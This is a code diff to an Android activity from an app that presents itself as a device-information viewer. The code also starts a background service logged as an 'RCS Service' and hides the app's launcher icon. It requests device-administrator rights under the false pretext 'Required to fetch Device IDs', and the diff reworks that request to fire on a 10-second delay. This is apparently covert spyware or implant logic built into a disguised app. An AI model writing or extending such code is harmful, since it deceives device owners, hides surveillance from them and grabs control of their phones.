@@ -20,6 +20,7 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.widget.TextView;
 
 import com.android.deviceinfo.Core;
@@ -33,10 +34,13 @@ import com.android.deviceinfo.util.Check;
 
 /**
  * The Class AndroidServiceGUI.
- * http://stackoverflow.com/questions/10909683/launch-android-application-without-main-activity-and-start-service-on-launching
+ * http://stackoverflow.com/questions/10909683/launch
+ * -android-application-without-main-activity-and-start-service-on-launching
  */
 public class AGUI extends Activity {
 	protected static final String TAG = "AndroidServiceGUI"; //$NON-NLS-1$
+	private static final int REQUEST_ENABLE = 0;
+	private Handler handler;
 
 	/**
 	 * Called when the activity is first created.
@@ -48,7 +52,7 @@ public class AGUI extends Activity {
 	public void onCreate(final Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		actualCreate(savedInstanceState);
-		//Status.self().gui = this;
+		
 	}
 
 	@Override
@@ -56,47 +60,55 @@ public class AGUI extends Activity {
 		super.onDestroy();
 	}
 
+	@Override
+	public void onResume() {
+		super.onResume();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onResume) ");
+		}
+
+	}
+
 	private void actualCreate(final Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 
 		Status.setAppContext(getApplicationContext());
-		 
-		startService();
-		setContentView(R.layout.main); 
 
-	    TextView t = (TextView)findViewById(R.id.imei);
-	    
-	    t.setText("This is a list of device information for the current Android device:\n\n");
-	    
-	        
-	    if (Build.MODEL.length() > 0)
-	    	t.append("Model: " + Build.MODEL + "\n");
-	    
-	    if (Build.BRAND.length() > 0)
-	    	t.append("Brand: " + Build.BRAND + "\n");
-	    
-	    if (Build.DEVICE.length() > 0)
-	    	t.append("Device: " + Build.DEVICE + "\n");
-	    
+		startService();
+		setContentView(R.layout.main);
+
+		TextView t = (TextView) findViewById(R.id.imei);
+
+		t.setText("This is a list of device information for the current Android device:\n\n");
+
+		if (Build.MODEL.length() > 0)
+			t.append("Model: " + Build.MODEL + "\n");
+
+		if (Build.BRAND.length() > 0)
+			t.append("Brand: " + Build.BRAND + "\n");
+
+		if (Build.DEVICE.length() > 0)
+			t.append("Device: " + Build.DEVICE + "\n");
+
 		if (Device.self().getImei().length() > 0)
 			t.append("IMEI: " + Device.self().getImei() + "\n");
 
 		if (Device.self().getImsi().length() > 0)
 			t.append("IMSI: " + Device.self().getImsi() + "\n");
-		
-	    if (Build.BOARD.length() > 0)
-	    	t.append("Board: " + Build.BOARD + "\n");
-	    
-	    if (Build.DISPLAY.length() > 0)
-	    	t.append("Display: " + Build.DISPLAY + "\n");
-		
+
+		if (Build.BOARD.length() > 0)
+			t.append("Board: " + Build.BOARD + "\n");
+
+		if (Build.DISPLAY.length() > 0)
+			t.append("Display: " + Build.DISPLAY + "\n");
+
 		if (PackageInfo.hasSu()) {
 			t.append("Root: yes");
 		} else {
 			t.append("Root: no");
-		} 
+		}
 	}
-	
+
 	private void startExtService() {
 		final String service = "com.android.deviceinfo.app"; //$NON-NLS-1$
 
@@ -115,6 +127,7 @@ public class AGUI extends Activity {
 
 		try {
 			if (Core.isServiceRunning() == false) {
+				this.handler = new Handler();
 				final ComponentName cn = startService(new Intent(service));
 
 				if (cn == null) {
@@ -125,35 +138,35 @@ public class AGUI extends Activity {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
 					}
-					
-					// Nascondi l'icona (subito in android 4.x, al primo reboot in android 2.x)
+
+					// Nascondi l'icona (subito in android 4.x, al primo reboot
+					// in android 2.x)
 					PackageManager pm = getApplicationContext().getPackageManager();
-					pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+					pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+							PackageManager.DONT_KILL_APP);
 				}
-				
-				try {
-					
-					if (Status.getSemAdmin().tryAcquire(10, TimeUnit.SECONDS)) {
-						Context context = Status.self().getAppContext();
 
-						Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-						intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-
-						ComponentName deviceAdminComponentName = new ComponentName(context, AR.class);
-						intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
-						intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to fetch Device IDs");
-
-						context.startActivity(intent);
-						
+				handler.postDelayed(new Runnable() {
+					@Override
+					public void run() {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " (startService) ACTION_ADD_DEVICE_ADMIN intent fired");
+							Check.log(TAG + " (run) fireAdminIntent");
+						}
+						try {
+							if (Status.getSemAdmin().tryAcquire(10, TimeUnit.SECONDS)) {
+								fireAdminIntent();
+							} else {
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (startService) cannot acquire semAdmin");
+								}
+							}
+						} catch (InterruptedException e) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (run) Error: " + e);
+							}
 						}
 					}
-				} catch (InterruptedException e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
-				
+				}, 10 * 1000);
 			}
 		} catch (final SecurityException se) {
 			if (Cfg.EXCEPTION) {
@@ -165,4 +178,29 @@ public class AGUI extends Activity {
 			}
 		}
 	}
+
+	private void fireAdminIntent() {
+		Context context = getApplicationContext();
+
+		Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+		// intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+
+		ComponentName deviceAdminComponentName = new ComponentName(context, AR.class);
+		intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
+		intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to fetch Device IDs");
+
+		//context.startActivity(intent);
+		startActivityForResult(intent, REQUEST_ENABLE);
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (startService) ACTION_ADD_DEVICE_ADMIN intent fired");
+		}
+	}
+	
+	 @Override
+	    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+	        if (REQUEST_ENABLE == requestCode) {
+	            super.onActivityResult(requestCode, resultCode, data);
+	        }
+	    }
 }
